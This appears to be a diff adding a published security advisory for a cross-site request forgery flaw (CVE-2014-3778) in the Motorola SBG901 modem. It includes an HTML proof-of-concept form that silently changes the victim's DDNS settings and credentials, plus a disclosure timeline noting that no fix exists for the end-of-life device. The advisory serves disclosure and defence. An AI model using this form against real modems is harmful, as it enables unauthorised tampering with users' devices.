@@ -1,0 +1,56 @@
+Exploit Title :  Motorola SBG901 Wireless Modem CSRF Vulnerability
+Google dork : N/A
+Exploit Author: Blessen Thomas
+Date : 06/01/2014
+Vendor Homepage : http://www.arrisi.com/modems/
+Software Link : N/A
+Version : Motorola SBG901 Wireless modem
+Tested on : Windows 7
+CVE : CVE-2014-3778
+Type of Application :  Web application
+Release mode : Coordinated disclosure
+
+Vulnerability description:
+It was observed that this modem's Web Application , is vulnerable to
+Cross-site request forgery through which attacker could manipulate user
+data via sending the victim malicious crafted url.
+
+At attacker could change the username,password ,dns service and host name
+of the victim's account without the victim's knowledge.
+
+Cross site request forgery
+x.x.x.x is the ip address of the modem.
+
+
+
+<html>
+  <!-- CSRF PoC --->
+  <body>
+    <form action="http://x.x.x.x/goform/RgDdns" method="POST">
+      <input type="hidden" name="DdnsService" value="1" />
+      <input type="hidden" name="DdnsUserName" value="test" />
+      <input type="hidden" name="DdnsPassword" value="test" />
+      <input type="hidden" name="DdnsHostName" value="test" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+Tools used :
+Mozilla firefox browser v28.0 , Burp proxy free edition v1.5
+
+Timeline:
+- 31-03-14: Contacted Vendor with details of Vulnerability and Exploit.
+- 01-04-14: Vendor ARRIS (formerly Motorola) forwards to Surfboard Gateway
+product team for review
+- 15-04-14: Vendor contacted to know the status.
+- 01-05-14 : Contacted vendor to know the status and release the advisory
+publically
+- 02-05-14: Vendor acknowledged and responded that currently no fix
+available since the product is no longer in production and due end of life
+status product
+-14-05-14: Contacted vendor the final time to release the security advisory
+ publically.
+-14-05-14 : Vendor responded to release the advisory publically.
+-15-05-14: Requested CVE ID from Mitre team
+-22-05-14: CVE ID obtained
